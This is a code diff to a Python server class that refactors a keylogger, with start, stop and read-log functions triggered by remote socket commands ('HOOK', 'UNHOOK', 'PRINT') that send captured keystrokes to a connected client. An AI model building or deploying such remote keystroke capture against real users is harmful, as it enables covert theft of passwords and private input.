@@ -312,9 +312,20 @@ class Server:
     #     self.nw.write(s)
     #     self.nw.flush()
 
+    def receiveSignal(self, conn):
+        try:
+            with self.nr_lock:
+                signal_data = conn.recv(1024).decode("utf-8")
+                return signal_data
+        except Exception as e:
+            print("Error receiving signal:", str(e))
+            return ""
+        
     def start_keylog (self):
-        with keyboard.Listener(on_press = self.on_key_press) as listener:
-                listener.join()
+        # with keyboard.Listener(on_press = self.on_key_press) as listener:
+        #         listener.join()
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.start()            
     
     def on_key_press(self, key):
         try:
@@ -332,7 +343,7 @@ class Server:
             return log_file.read()
         
     def stop_keylog (self):
-        keyboard.Listener.stop()
+        self.listener.stop()
         pass
     
     def keylog(self, conn):
@@ -344,23 +355,14 @@ class Server:
             if s == "PRINT":
                 data = self.read_log_file()
                 print(data)
-                self.clients.send(data.encode())
+                conn.send(data.encode())
             elif s == "HOOK":
                 self.start_keylog()
             elif s == "UNHOOK":
                 self.stop_keylog()
             elif s == "QUIT":
-                self.clients.close()
+                conn.close()
                 return
-
-    def receiveSignal(self, conn):
-        try:
-            with self.nr_lock:
-                signal_data = conn.recv(1024).decode("utf-8")
-                return signal_data
-        except Exception as e:
-            print("Error receiving signal:", str(e))
-            return ""
 
     def run_app(self, app_name):
         try:
